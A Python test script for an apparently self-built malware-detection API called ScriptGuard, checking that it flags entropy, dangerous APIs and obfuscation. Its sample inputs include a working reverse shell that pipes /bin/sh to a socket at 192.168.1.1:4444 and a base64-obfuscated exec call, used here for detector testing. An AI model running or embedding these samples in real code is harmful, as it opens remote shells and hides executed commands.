#!/usr/bin/env python3
"""
Test API endpoint with feature analysis (Component 2 - Stage 2E).

Tests:
1. Feature analysis in API response
2. Hybrid search integration
3. Feature-based explainability

Usage:
    # Start API first:
    python start_api.py

    # Then run tests:
    python scripts/test_api_feature_analysis.py
"""

import requests
import json
import os
import sys

# Load environment variables
from dotenv import load_dotenv
load_dotenv()


def test_benign_code():
    """Test API with benign code - should have low risk features."""
    print("\n" + "=" * 60)
    print("TEST 1: Benign Code Analysis")
    print("=" * 60)

    benign_code = """
def hello(name):
    print(f"Hello, {name}!")

hello("World")
"""

    response = requests.post(
        "http://localhost:8000/analyze",
        headers={
            "X-API-Key": os.getenv("SCRIPTGUARD_API_KEY", "test-api-key"),
            "Content-Type": "application/json"
        },
        json={
            "script_content": benign_code,
            "include_rag": True
        }
    )

    print(f"Status Code: {response.status_code}")

    if response.status_code == 200:
        data = response.json()
        print(f"Is Malicious: {data.get('is_malicious')}")
        print(f"Confidence: {data.get('confidence'):.2f}")

        # Check feature analysis
        features = data.get('feature_analysis')
        if features:
            print("\nFeature Analysis:")
            print(f"  Entropy: {features.get('entropy', 0):.2f}")
            print(f"  Complexity: {features.get('complexity_score', 0)}")
            print(f"  Dangerous Patterns: {features.get('dangerous_patterns', [])}")
            print(f"  Has Obfuscation: {features.get('has_obfuscation', False)}")
            print(f"  Has Dangerous APIs: {features.get('has_dangerous_apis', False)}")
            print(f"  API Usage: {features.get('api_usage', {})}")

            # Validation
            assert features.get('entropy', 0) < 6.0, "Benign code should have low entropy"
            assert not features.get('has_dangerous_apis', False), "Benign code shouldn't have dangerous APIs"
            print("✓ Benign code features look correct")
        else:
            print("⚠️  No feature analysis in response (may need to re-vectorize with features)")

    else:
        print(f"❌ API Error: {response.text}")


def test_malicious_code():
    """Test API with malicious code - should have high risk features."""
    print("\n" + "=" * 60)
    print("TEST 2: Malicious Code Analysis")
    print("=" * 60)

    malicious_code = """
import socket
import subprocess

def reverse_shell(host, port):
    s = socket.socket()
    s.connect((host, port))
    subprocess.call(['/bin/sh', '-i'], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())

reverse_shell('192.168.1.1', 4444)
"""

    response = requests.post(
        "http://localhost:8000/analyze",
        headers={
            "X-API-Key": os.getenv("SCRIPTGUARD_API_KEY", "test-api-key"),
            "Content-Type": "application/json"
        },
        json={
            "script_content": malicious_code,
            "include_rag": True
        }
    )

    print(f"Status Code: {response.status_code}")

    if response.status_code == 200:
        data = response.json()
        print(f"Is Malicious: {data.get('is_malicious')}")
        print(f"Confidence: {data.get('confidence'):.2f}")

        # Check feature analysis
        features = data.get('feature_analysis')
        if features:
            print("\nFeature Analysis:")
            print(f"  Entropy: {features.get('entropy', 0):.2f}")
            print(f"  Complexity: {features.get('complexity_score', 0)}")
            print(f"  Dangerous Patterns: {features.get('dangerous_patterns', [])}")
            print(f"  Suspicious Combinations: {features.get('suspicious_combinations', [])}")
            print(f"  Has Obfuscation: {features.get('has_obfuscation', False)}")
            print(f"  Has Dangerous APIs: {features.get('has_dangerous_apis', False)}")
            print(f"  API Usage: {features.get('api_usage', {})}")

            # Validation
            assert features.get('has_dangerous_apis', False), "Malicious code should have dangerous APIs"
            assert features.get('api_usage', {}).get('network', False), "Should detect network API usage"
            assert features.get('api_usage', {}).get('process', False), "Should detect process API usage"

            dangerous_patterns = features.get('dangerous_patterns', [])
            assert len(dangerous_patterns) > 0, "Should detect dangerous patterns"
            print(f"✓ Malicious code features detected: {dangerous_patterns}")
        else:
            print("⚠️  No feature analysis in response")

    else:
        print(f"❌ API Error: {response.text}")


def test_obfuscated_code():
    """Test API with obfuscated code - should detect high entropy."""
    print("\n" + "=" * 60)
    print("TEST 3: Obfuscated Code Analysis")
    print("=" * 60)

    obfuscated_code = """
import base64
exec(base64.b64decode('aW1wb3J0IG9zCm9zLnN5c3RlbSgnd2hvYW1pJyk='))
"""

    response = requests.post(
        "http://localhost:8000/analyze",
        headers={
            "X-API-Key": os.getenv("SCRIPTGUARD_API_KEY", "test-api-key"),
            "Content-Type": "application/json"
        },
        json={
            "script_content": obfuscated_code,
            "include_rag": True
        }
    )

    print(f"Status Code: {response.status_code}")

    if response.status_code == 200:
        data = response.json()
        print(f"Is Malicious: {data.get('is_malicious')}")
        print(f"Confidence: {data.get('confidence'):.2f}")

        # Check feature analysis
        features = data.get('feature_analysis')
        if features:
            print("\nFeature Analysis:")
            print(f"  Entropy: {features.get('entropy', 0):.2f}")
            print(f"  Has Obfuscation: {features.get('has_obfuscation', False)}")
            print(f"  Has Base64: {features.get('string_patterns', {}).get('base64', False)}")
            print(f"  Dangerous Patterns: {features.get('dangerous_patterns', [])}")

            # Validation
            assert 'exec' in features.get('dangerous_patterns', []), "Should detect exec"
            assert features.get('string_patterns', {}).get('base64', False), "Should detect base64"
            print("✓ Obfuscation detected correctly")
        else:
            print("⚠️  No feature analysis in response")

    else:
        print(f"❌ API Error: {response.text}")


def main():
    print("Testing API Feature Analysis")
    print("=" * 60)
    print("\nPrerequisites:")
    print("  1. API server running at http://localhost:8000")
    print("  2. Collection re-vectorized with features")
    print("  3. SCRIPTGUARD_API_KEY environment variable set")
    print("=" * 60)

    # Check API is running
    try:
        health_response = requests.get("http://localhost:8000/health", timeout=5)
        if health_response.status_code != 200:
            print("\n❌ API is not responding correctly")
            print("   Start API first: python start_api.py")
            return 1
        print("✓ API is running")
    except requests.exceptions.RequestException as e:
        print(f"\n❌ Cannot connect to API: {e}")
        print("   Start API first: python start_api.py")
        return 1

    # Run tests
    try:
        test_benign_code()
        test_malicious_code()
        test_obfuscated_code()

        print("\n" + "=" * 60)
        print("✅ ALL API TESTS PASSED")
        print("=" * 60)
        print("\nFeature analysis is working in the API!")
        print("The API now provides:")
        print("  ✓ Feature-based explainability")
        print("  ✓ Hybrid vector + feature search")
        print("  ✓ Better detection of obfuscated malware")

    except AssertionError as e:
        print(f"\n❌ TEST FAILED: {e}")
        return 1
    except Exception as e:
        print(f"\n❌ UNEXPECTED ERROR: {e}")
        import traceback
        traceback.print_exc()
        return 1

    return 0


if __name__ == "__main__":
    sys.exit(main())
